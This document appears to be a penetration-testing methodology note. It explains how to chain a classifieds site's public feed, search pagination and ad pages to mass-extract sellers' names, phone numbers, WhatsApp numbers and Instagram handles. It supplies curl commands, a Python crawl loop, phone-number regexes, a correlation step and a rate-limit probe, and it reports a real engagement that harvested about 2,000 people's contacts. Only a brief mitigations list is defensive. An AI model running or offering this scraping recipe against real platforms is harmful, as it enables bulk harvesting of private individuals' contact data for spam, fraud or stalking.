# Chained Data Extraction — Public Feed → Search → Ad Pages

**Pattern:** Classifieds/marketplace platforms often expose user PII (name, phone, WhatsApp, Instagram) through multiple public endpoints that can be chained for mass extraction.

## The Chain

```
Feed API (names + URLs) → Search API (all URLs) → Ad Pages (phones + WhatsApp + Instagram)
```

## Step 1: Find a Public Notification/Activity Feed

Look for endpoints that return recent activity without authentication:

- `/api/notifications_feed.php`
- `/api/activity.php`
- `/api/events.php`
- `/api/feed.php`

**Check:** Does it return `actor` (full name) + `url` (ad link) + `type` + `created_at`?

```bash
curl "https://target.com/api/notifications_feed.php?limit=12"
```

## Step 2: Find a Search/Browse Endpoint with Pagination

Most platforms have a search endpoint that returns ALL listings. It may be:

- `POST /index.php?action=search` (multipart form or URL-encoded)
- `GET /api/search?q=&page=N`
- `POST /api/v1/ads/search`
- `GET /busca?pagina=N`

**Keys to look for:**
- `page` parameter (pagination)
- `per_page` / `limit` parameter (items per page)
- `has_more` / `total` fields in response
- Response contains HTML with ad URLs or JSON with ad IDs

```bash
# Test the search endpoint
curl -X POST "https://target.com/index.php?action=search" \
  -d "page=1&per_page=36&tab=ads&sort=for_you"
```

**Expected response format:** JSON with `results_html` containing ad cards, or a JSON array of ad objects.

## Step 3: Extract All Ad URLs

Write a loop to crawl all pages until `has_more` is false:

```python
all_urls = set()
for page in range(1, 100):
    data = fetch_search(page)
    urls = extract_urls_from_html(data['results_html'])
    all_urls.update(urls)
    if not data.get('has_more'):
        break
```

## Step 4: Extract PII from Each Ad Page

Each ad page typically contains the seller's contact info:

| Data | Regex Pattern |
|------|--------------|
| Phone (BR) | `\((\d{2})\)\s*(\d{4,5})-?(\d{4})` |
| Phone (+55) | `\+55(\d{2})(\d{4,5})(\d{4})` |
| WhatsApp | `wa\.me/(\d+)` |
| Instagram | `instagram\.com/([a-zA-Z0-9._]+)` |

**Filter out platform-wide numbers** (e.g., support WhatsApp that appears on every ad).

```python
import re

def extract_pii(body):
    phones = []
    for m in re.findall(r'\((\d{2})\)\s*(\d{4,5})-?(\d{4})', body):
        p = f"({m[0]}) {m[1]}-{m[2]}"
        if p not in phones: phones.append(p)
    for m in re.findall(r'\+55(\d{2})(\d{4,5})(\d{4})', body):
        p = f"+55 ({m[0]}) {m[1]}-{m[2]}"
        if p not in phones: phones.append(p)
    wa = list(set(w for w in re.findall(r'wa\.me/(\d+)', body) if w != 'SUPPORT_NUMBER'))
    ig = list(set(re.findall(r'instagram\.com/([a-zA-Z0-9._]+)', body, re.I)))
    return phones, wa, ig
```

## Step 5: Correlate Data

If the notification feed returns names, cross-reference them by ad URL:

```python
name_map = {}
for event in feed['events']:
    name_map[event['url']] = event['actor']

for row in results:
    url = row['ad_url']
    row['name'] = name_map.get(url, '')
```

## Output Format

Save to CSV with fields: `name, ad_url, phones, whatsapp, instagram`

## Real-World Example (automotive-classifieds engagement)

- **Feed:** `GET /api/notifications_feed.php?limit=12` → 12 events with names + URLs
- **Search:** `POST /index.php?action=search` with `page=1..46&per_page=36` → 2,029 unique ad URLs
- **Ads:** Each `GET /ads/{slug}` → phone + WhatsApp + Instagram
- **Result:** 2,029 entries, 1,999 phones, 1,989 WhatsApp, 1,596 Instagram
- **Total time:** ~6 minutes automated
- **No rate limiting detected**

## Rate Limiting Test

Before mass extraction, test rate limiting:

```bash
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "Req $i: %{http_code}\n" "https://target.com/endpoint"
done
```

If all 20 return 200, no rate limiting.

## Mitigations (for defenders)

1. Add authentication to notification feed
2. Add rate limiting (10 req/min per IP)
3. Anonymize the `actor` field in public feeds
4. Protect search with CSRF token or auth
5. Obfuscate phone numbers on ad pages (show only first 4 digits)
6. Remove Instagram/WhatsApp from public ad pages